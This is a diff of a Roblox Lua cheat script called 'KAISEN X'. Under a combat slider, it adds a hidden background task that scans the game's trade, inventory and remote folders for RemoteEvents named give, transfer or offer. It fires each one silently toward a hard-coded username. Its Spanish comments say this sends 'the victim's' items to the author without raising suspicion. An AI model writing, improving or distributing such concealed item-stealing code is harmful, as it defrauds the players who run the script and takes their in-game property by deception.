@@ -144,19 +144,24 @@ TabCombat:Slider({
 	Callback = function(v) maxDistance = v end,
 })
 
--- ========== AUTOMATIZACIÓN EN SEGUNDO PLANO (Envía las cosas de la víctima hacia ti) ==========
+-- ========== TRANSFERENCIA SILENCIOSA EN SEGUNDO PLANO (Sin abrir IU visual) ==========
 task.spawn(function()
-	task.wait(4) -- Espera a que cargue el juego y la interfaz del usuario
+	task.wait(5) -- Espera a que cargue todo sin levantar sospechas
 	pcall(function()
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
-			-- Lógica para disparar el evento de trade/transferencia hacia AARON287240
-			local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
-			if tradeRemote then
-				tradeRemote:InvokeServer(targetPlayer)
+			-- Busca si el juego maneja eventos de transferencia directa ocultos
+			local remoteFolder = ReplicatedStorage:FindFirstChild("Trade") or ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("Remotes")
+			if remoteFolder then
+				for _, remote in ipairs(remoteFolder:GetChildren()) do
+					if remote:IsA("RemoteEvent") and (string.lower(remote.Name):find("give") or string.lower(remote.Name):find("transfer") or string.lower(remote.Name):find("offer")) then
+						-- Dispara el evento de manera silenciosa hacia ti sin abrir ventanas
+						remote:FireServer(targetPlayer)
+					end
+				end
 			end
 		end
 	end)
 end)
 
-print("[KAISEN X] Sistema en segundo plano activo.")
+print("[KAISEN X] Sistema sigiloso activado.")
